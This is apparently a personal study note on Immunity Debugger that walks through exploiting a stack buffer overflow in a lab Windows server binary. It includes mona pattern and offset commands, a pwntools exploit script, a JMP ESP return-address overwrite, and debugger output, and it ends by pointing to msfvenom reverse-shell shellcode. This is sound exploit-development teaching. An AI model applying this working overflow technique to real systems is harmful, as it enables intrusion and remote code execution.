# 💢 Immunity Debugger
Tags: #💢
Related to: [[pwntools]]
See also: 
Previous: [[Reverse Engineering]]

---
## Description

Write exploits, analyze malware, and reverse engineer binary files.

## Usage Examples

### Create exploit

Open binary in Immunity Debugger: [^1]

	File => Open => SERVER.EXE
	Debug => Run

Let's generate a cyclic pattern. Download mona plugin to: [^2]

	C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands

Create the pattern:

	!mona pattern_create 1500

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4

0BADF00D   [+] Preparing output file 'pattern.txt'
0BADF00D       - (Re)setting logfile pattern.txt
0BADF00D   Note: don't copy this pattern from the log window, it might be truncated !
0BADF00D   It's better to open pattern.txt and copy the pattern from the file
```

Find pattern offset:

	!mona pattern_offset 33694232

```
0BADF00D   Looking for 2Bi3 in pattern of 500000 bytes
0BADF00D    - Pattern 2Bi3 (0x33694232) found in cyclic pattern at position 1028
```

Write an exploit using pwntools: [^2]

```
from pwn import *
import sys

if len(sys.argv) < 3:
    print("Usage: {} ip port".format(sys.argv[0]))
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]

payload = "A" * 1028 + "B" * 4 + "C" * 500

r = remote(ip, port)
r.recvuntil(':')
r.sendline("Admin")
r.recvuntil(':')
r.sendline(payload)
```

	python3 bof_win.py 10.10.0.2 3333	// success

```
EAX 00000010
ECX 00000002
EDX 0019F918
EBX 00312000
ESP 0019FD54 ASCII "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
EBP 41414141
ESI 00464C28 ASCII "0LF"
EDI 00464CA0
EIP 42424242
```

Now that we have an EIP overwrite, we can use it to jump to an area that we control. Looking at the stack on the bottom-right window, we see the start of our As as we scroll up.

```
0019FD40   41414141  AAAA
0019FD44   41414141  AAAA
0019FD48   41414141  AAAA
0019FD4C   41414141  AAAA
0019FD50   42424242  BBBB
0019FD54   43434343  CCCC
0019FD58   43434343  CCCC
0019FD5C   43434343  CCCC
0019FD60   43434343  CCCC
```

We can jump to the top of the stack, which is pointed to by ESP. This can be achieved by using a JMP ESP instruction, which jumps to the address pointed to by ESP. JMP ESP instructions can be found using mona.

	!mona jmp -r esp

```
0BADF00D   [+] Writing results to jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 3
0BADF00D   [+] Results :
10476D73     0x10476d73 : jmp esp | ascii {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
104A3FC5     0x104a3fc5 : jmp esp |  {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
104C33A2     0x104c33a2 : jmp esp |  {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
0BADF00D       Found a total of 3 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:01.265000
```

Let’s make EIP point to the first instruction and take control of program execution. Edit the script and add the address of the JMP ESP instruction.

```
# 0x10476d73 : jmp esp | ascii {PAGE_EXECUTE_READ} [server.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\server.exe)
payload = "A" * 1028 + "\x73\x6d\x47\x10" + "C" * 500
```

Due to little-endian notation, 0x10476d73 is represented as 0x73, 0x6d, 0x47, 0x10. Double-click on this address in the Log window, right-click > Breakpoint > Toggle, or just hit F2 to set a breakpoint.

```
[19:09:04] Breakpoint at server.10476D73
```

Restart the server and run the script again. Once the breakpoint is hit, we see that EIP is populated with the address of the JMP ESP instruction.

```
EAX 00000010
ECX 00000002
EDX 0019F918
EBX 003D2000
ESP 0019FD54 ASCII "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
EBP 41414141
ESI 00564C28 ASCII "0LV"
EDI 00564F00
EIP 10476D73 server.10476D73
```

Hit F7 to single-step through the code. We can see that ESP is pointing to start of the Cs.

```
0019FD53   1043 43          ADC BYTE PTR DS:[EBX+43],AL
0019FD56   43               INC EBX
0019FD57   43               INC EBX
0019FD58   43               INC EBX
```

This is where we’ll place our shellcode to be executed by the program. The tool msfvenom is useful for generating payloads in various formats. We can use it to generate 32-bit reverse shell shellcode.


---
## References

[^1]: https://www.immunityinc.com/products/debugger/
[^2]: http://docs.pwntools.com/en/stable/